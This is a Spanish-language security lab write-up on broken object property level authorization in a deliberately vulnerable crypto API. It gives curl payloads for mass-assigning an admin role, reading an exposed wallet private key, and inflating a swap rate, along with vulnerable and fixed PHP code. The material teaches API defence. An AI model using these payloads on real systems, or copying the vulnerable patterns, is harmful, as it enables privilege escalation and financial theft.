# LAB 03 - Broken Object Property Level Authorization (BOPLA)

## Referencia OWASP: API3:2023 - Broken Object Property Level Authorization

---

## Objetivo

Explotar la falta de control de propiedades a nivel de objeto en la API de CryptoVulnX mediante tres vectores: asignacion masiva (mass assignment) en el registro de usuarios, exposicion excesiva de datos en respuestas de la API, y manipulacion de parametros en operaciones de intercambio de criptomonedas.

---

## Contexto

La vulnerabilidad BOPLA combina dos problemas clasicos:

- **Mass Assignment (Asignacion Masiva)**: La API acepta y procesa propiedades del objeto que no deberian ser modificables por el usuario. Por ejemplo, al registrarse, un usuario puede enviar campos adicionales como `role` o `kyc_verified` que la API asigna directamente al objeto en la base de datos.

- **Excessive Data Exposure (Exposicion Excesiva de Datos)**: La API devuelve mas propiedades de las necesarias en las respuestas, exponiendo informacion sensible como claves privadas, datos internos o configuraciones que el cliente no deberia ver.

En CryptoVulnX, estas vulnerabilidades se manifiestan en tres puntos criticos:

1. El endpoint de registro acepta cualquier campo JSON y lo inserta directamente en la base de datos, permitiendo auto-asignarse el rol de administrador.
2. El endpoint de balance devuelve la clave privada de la wallet junto con la informacion del balance.
3. El endpoint de swap acepta un parametro `rate` personalizado del cliente, permitiendo manipular la tasa de conversion.

---

## Endpoints Involucrados

| Metodo | Endpoint | Descripcion |
|--------|----------|-------------|
| `POST` | `/api/v1/auth/register.php` | Registro de usuarios (vulnerable a mass assignment) |
| `GET` | `/api/v1/wallets/balance.php` | Consulta de balance (expone private_key) |
| `POST` | `/api/v1/crypto/swap.php` | Intercambio de criptomonedas (acepta rate personalizado) |

---

## Dificultad

**Baja a Media** - Mass assignment y exposicion de datos requieren solo observacion. La manipulacion de rate requiere entender la logica del swap.

---

## Pistas

### Pista 1 - Mass Assignment
Observa los campos que envia el formulario de registro. Ahora piensa: ¿que otros campos podria tener la tabla de usuarios en la base de datos? Campos como `role`, `kyc_verified`, `is_admin` son comunes. Intenta agregarlos en tu peticion JSON de registro.

### Pista 2 - Exposicion de Datos
Realiza una consulta al endpoint de balance de tu wallet y examina cuidadosamente TODOS los campos de la respuesta JSON. ¿Hay algun campo que no deberia estar visible para el usuario a traves de la API?

### Pista 3 - Manipulacion de Rate
El endpoint de swap calcula cuanto recibes basandose en un parametro `rate`. ¿Que pasa si incluyes tu propio valor de `rate` en la peticion? El servidor no valida este valor contra la tasa real del mercado.

---

## Solucion

### Ataque 1 - Mass Assignment en Registro

#### Paso 1 - Registro normal para observar el flujo

```bash
curl -s -X POST http://localhost/appsec/api/v1/auth/register.php \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","email":"test@test.com","password":"test123"}'
```

Respuesta esperada:
```json
{
  "status": "success",
  "user_id": 5,
  "role": "user",
  "kyc_verified": 0
}
```

#### Paso 2 - Registro con mass assignment para obtener rol admin

```bash
curl -s -X POST http://localhost/appsec/api/v1/auth/register.php \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hacker",
    "email": "h@h.com",
    "password": "test",
    "role": "admin",
    "kyc_verified": 1
  }'
```

Respuesta esperada:
```json
{
  "status": "success",
  "user_id": 6,
  "role": "admin",
  "kyc_verified": 1
}
```

**El usuario se ha registrado como administrador con KYC verificado.**

#### Paso 3 - Verificar acceso de admin

```bash
# Login con el nuevo usuario admin
curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"test"}'

# Usar el token para acceder a endpoints de admin
curl -s -X GET http://localhost/appsec/api/v1/admin/users.php \
  -H "Authorization: Bearer <TOKEN_HACKER>"
```

---

### Ataque 2 - Exposicion Excesiva de Datos

#### Paso 1 - Consultar balance de la wallet

```bash
curl -s -X GET "http://localhost/appsec/api/v1/wallets/balance.php?wallet_id=3" \
  -H "Authorization: Bearer <TOKEN>"
```

Respuesta esperada:
```json
{
  "wallet_id": 3,
  "user_id": 3,
  "balance": "0.05000000",
  "currency": "BTC",
  "address": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
  "private_key": "L4gB7MyCKQBuWNbKzYToGMC2VDh6HTfnm7RwG9GU1N6GBHAaRdZq",
  "created_at": "2024-01-10T08:00:00Z",
  "internal_flags": "standard_tier",
  "last_ip": "192.168.1.50"
}
```

**La respuesta expone la `private_key`, `internal_flags` y `last_ip` del usuario, campos que nunca deberian ser visibles en la API.**

---

### Ataque 3 - Manipulacion de Rate en Swap

#### Paso 1 - Realizar un swap normal

```bash
curl -s -X POST http://localhost/appsec/api/v1/crypto/swap.php \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{
    "from": "BTC",
    "to": "ETH",
    "amount": 0.01
  }'
```

Respuesta esperada:
```json
{
  "status": "success",
  "from": "BTC",
  "to": "ETH",
  "amount_sent": 0.01,
  "rate": 15.5,
  "amount_received": 0.155
}
```

#### Paso 2 - Enviar un rate personalizado manipulado

```bash
curl -s -X POST http://localhost/appsec/api/v1/crypto/swap.php \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{
    "from": "BTC",
    "to": "ETH",
    "amount": 0.01,
    "rate": 999999
  }'
```

Respuesta esperada:
```json
{
  "status": "success",
  "from": "BTC",
  "to": "ETH",
  "amount_sent": 0.01,
  "rate": 999999,
  "amount_received": 9999.99
}
```

**Con 0.01 BTC se obtienen 9,999.99 ETH al manipular la tasa de conversion.**

---

## Remediacion

### 1. Corregir Mass Assignment - Lista Blanca de Campos

```php
// VULNERABLE - Acepta todos los campos del JSON
$data = json_decode(file_get_contents("php://input"), true);
$query = "INSERT INTO users (username, email, password, role, kyc_verified)
          VALUES ('{$data['username']}', '{$data['email']}', '{$data['password']}',
                  '{$data['role']}', '{$data['kyc_verified']}')";

// SEGURO - Lista blanca de campos permitidos
$data = json_decode(file_get_contents("php://input"), true);

// Solo aceptar campos permitidos para registro
$allowed_fields = ['username', 'email', 'password'];
$filtered_data = array_intersect_key($data, array_flip($allowed_fields));

// Valores por defecto seguros para campos sensibles
$stmt = $conn->prepare("INSERT INTO users (username, email, password_hash, role, kyc_verified)
                         VALUES (?, ?, ?, 'user', 0)");
$password_hash = password_hash($filtered_data['password'], PASSWORD_BCRYPT);
$stmt->bind_param("sss", $filtered_data['username'], $filtered_data['email'], $password_hash);
$stmt->execute();
```

### 2. Corregir Exposicion de Datos - Filtrar Propiedades de Respuesta

```php
// VULNERABLE - Devuelve SELECT * completo
$query = "SELECT * FROM wallets WHERE id = $wallet_id";
$result = $conn->query($query);
echo json_encode($result->fetch_assoc());

// SEGURO - Seleccionar solo campos necesarios y filtrar respuesta
$stmt = $conn->prepare("SELECT id, balance, currency, address FROM wallets WHERE id = ? AND user_id = ?");
$stmt->bind_param("ii", $wallet_id, $authenticated_user_id);
$stmt->execute();
$wallet = $stmt->get_result()->fetch_assoc();

// Capa adicional: filtrar propiedades de salida
$public_fields = ['id', 'balance', 'currency', 'address'];
$response = array_intersect_key($wallet, array_flip($public_fields));
echo json_encode($response);
```

### 3. Corregir Manipulacion de Rate - Validar en el Servidor

```php
// VULNERABLE - Acepta rate del cliente
$data = json_decode(file_get_contents("php://input"), true);
$rate = $data['rate'] ?? getMarketRate($data['from'], $data['to']);
$amount_received = $data['amount'] * $rate;

// SEGURO - Obtener rate exclusivamente del servidor
$data = json_decode(file_get_contents("php://input"), true);

// IGNORAR cualquier valor de rate enviado por el cliente
$rate = getMarketRate($data['from'], $data['to']); // Fuente confiable del servidor
$amount_received = $data['amount'] * $rate;

// Validar que el rate es razonable
if ($rate <= 0 || $rate > 1000000) {
    http_response_code(500);
    echo json_encode(["error" => "Error al obtener tasa de mercado"]);
    exit;
}
```

### Principios de Remediacion

1. **Lista blanca de campos**: Definir explicitamente los campos que la API acepta en cada endpoint. Rechazar o ignorar cualquier campo adicional.
2. **Filtrar respuestas**: Nunca usar `SELECT *`. Seleccionar solo los campos necesarios y aplicar un filtro adicional antes de enviar la respuesta.
3. **Valores del servidor**: Los valores criticos como tasas de cambio, roles y estados deben calcularse o asignarse exclusivamente en el servidor.
4. **DTOs (Data Transfer Objects)**: Implementar objetos de transferencia de datos que definan estrictamente las propiedades de entrada y salida.
5. **Validacion de esquema**: Usar validacion de esquema JSON para rechazar peticiones con propiedades no esperadas.
